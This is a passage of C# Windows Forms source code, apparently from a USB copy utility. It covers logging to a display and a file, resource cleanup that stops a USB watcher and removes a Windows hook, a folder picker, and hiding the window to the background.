                var logEntry = $"[{DateTime.Now:HH:mm:ss}] {message}";
                var stackTrace = new StackTrace(2, true);
                var frame = stackTrace.GetFrame(0);
                var lineInfo = $"{Path.GetFileName(frame.GetFileName())}:{frame.GetFileLineNumber()}";

                if (isError)
                {
                    UpdateLogBuffer(logEntry);
                    UpdateLogDisplay(logEntry);
                }

                WriteToLogFile(logEntry);
            }
            catch (Exception ex)
            {
                var errorMessage = $"[{DateTime.Now:HH:mm:ss}] 日志记录失败: {ex.Message}";
                WriteToLogFile(errorMessage);
                UpdateLogDisplay(errorMessage);
            }
        }

        private void UpdateLogBuffer(string entry)
        {
            lock (_logBuffer)
            {
                _logBuffer.AppendLine(entry);
                var lines = _logBuffer.ToString().Split('\n');
                _currentLogLines = lines.Length - 1;

                if (_currentLogLines > MaxLogLines)
                {
                    var trimmed = string.Join("\n", lines.Skip(lines.Length - MaxLogLines - 1));
                    _logBuffer.Clear();
                    _logBuffer.Append(trimmed);
                    _currentLogLines = MaxLogLines;
                }
            }
        }

        private void UpdateLogDisplay(string entry)
        {
            if (richTextBox1.InvokeRequired)
            {
                richTextBox1.BeginInvoke((Action)(() => UpdateLogDisplay(entry)));
                return;
            }

            richTextBox1.AppendText(entry + Environment.NewLine);
            richTextBox1.ScrollToCaret();
        }

        private void WriteToLogFile(string entry)
        {
            try
            {
                if (!string.IsNullOrEmpty(_logPath))
                {
                    File.AppendAllText(_logPath, entry + Environment.NewLine);
                }
            }
            catch (Exception ex)
            {
                var errorMessage = $"[{DateTime.Now:HH:mm:ss}] 日志文件写入失败: {ex.Message}";
                _ = SafeInvokeAsync(() => richTextBox1.AppendText(errorMessage + Environment.NewLine));

                try
                {
                    string backupLog = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "CopyLog.txt");
                    File.AppendAllText(backupLog, errorMessage + Environment.NewLine);
                }
                catch { }
            }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            _cts?.Cancel();
            _ = CleanupResourcesAsync();
            base.OnFormClosing(e);
        }

        private async Task CleanupResourcesAsync()
        {
            try
            {
                await Task.Delay(500);
                _usbWatcher?.Stop();
                _usbWatcher?.Dispose();
                if (_hookID != IntPtr.Zero)
                {
                    UnhookWindowsHookEx(_hookID);
                    _hookID = IntPtr.Zero;
                }
            }
            catch { }
        }

        private void ShowMainWindow()
        {
            this.Show();
            this.WindowState = FormWindowState.Normal;
            this.ShowInTaskbar = true;
            this.BringToFront();
        }

        private void ExitApplication()
        {
            if (_hookID != IntPtr.Zero)
                UnhookWindowsHookEx(_hookID);
            Application.Exit();
        }

        private void Button2_Click(object sender, EventArgs e)
        {
            using (var fbd = new FolderBrowserDialog())
            {
                if (fbd.ShowDialog() == DialogResult.OK)
                {
                    textBox2.Text = fbd.SelectedPath;
                }
            }
        }

        private void Button1_Click_1(object sender, EventArgs e)
        {
            this.Hide();
            this.ShowInTaskbar = false;
        }
    }
}